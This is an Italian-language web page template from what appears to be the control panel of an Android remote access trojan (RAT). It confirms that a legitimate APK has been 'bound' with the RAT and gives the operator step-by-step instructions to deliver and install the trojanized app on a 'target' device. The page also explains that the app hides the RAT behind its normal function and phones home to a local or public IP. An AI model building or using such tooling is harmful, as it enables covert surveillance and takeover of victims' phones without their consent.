{% extends "base.html" %}

{% block title %}Binding Completato - RAT Control Panel{% endblock %}

{% block content %}
<div class="row">
    <div class="col-12">
        <div class="card">
            <div class="card-header bg-success text-white">
                <h4 class="mb-0"><i class="bi bi-check-circle"></i> Binding Completato con Successo</h4>
            </div>
            <div class="card-body">
                <div class="alert alert-success">
                    <h5><i class="bi bi-emoji-smile"></i> APK Modificato Creato con Successo!</h5>
                    <p>L'APK è stato modificato con successo e ora include il RAT con configurazione dual-IP.</p>
                </div>
                
                <div class="row mb-4">
                    <div class="col-md-6">
                        <div class="card mb-3">
                            <div class="card-header bg-light">
                                <h6 class="mb-0">Dettagli APK</h6>
                            </div>
                            <div class="card-body">
                                <p><strong>Nome File:</strong> {{ filename }}</p>
                                <p><strong>IP Locale:</strong> {{ local_ip }}</p>
                                <p><strong>IP Pubblico:</strong> {{ public_ip }}</p>
                                <p><strong>Porta:</strong> {{ port }}</p>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-6">
                        <div class="card mb-3">
                            <div class="card-header bg-light">
                                <h6 class="mb-0">Download e Installazione</h6>
                            </div>
                            <div class="card-body">
                                <p>Scarica l'APK modificato e installalo sul dispositivo Android target.</p>
                                <a href="{{ download_link }}" class="btn btn-primary btn-lg d-block">
                                    <i class="bi bi-download"></i> Scarica APK Modificato
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="alert alert-info">
                    <h5><i class="bi bi-info-circle"></i> Prossimi Passi</h5>
                    <ol>
                        <li>Scarica l'APK modificato utilizzando il pulsante qui sopra</li>
                        <li>Trasferisci l'APK sul dispositivo Android target (via USB, email, cloud, ecc.)</li>
                        <li>Sul dispositivo Android, abilita "Installazione da origini sconosciute" nelle impostazioni di sicurezza</li>
                        <li>Installa l'APK modificato</li>
                        <li>Apri l'applicazione per avviare il RAT</li>
                        <li>Il dispositivo apparirà nella <a href="/devices">lista dei dispositivi</a> quando si connette</li>
                    </ol>
                </div>
                
                <div class="alert alert-warning">
                    <h5><i class="bi bi-exclamation-triangle"></i> Importante</h5>
                    <p>L'APK modificato funzionerà come l'originale, ma includerà anche il RAT che si connetterà al server.</p>
                    <p>Il RAT tenterà prima di connettersi usando l'IP locale ({{ local_ip }}). Se non riesce a connettersi, passerà automaticamente all'IP pubblico ({{ public_ip }}).</p>
                </div>
                
                <div class="d-grid gap-2 d-md-flex justify-content-md-center mt-4">
                    <a href="/bind" class="btn btn-secondary me-md-2">
                        <i class="bi bi-arrow-left"></i> Torna al Binding
                    </a>
                    <a href="/devices" class="btn btn-primary">
                        <i class="bi bi-phone"></i> Vai ai Dispositivi
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}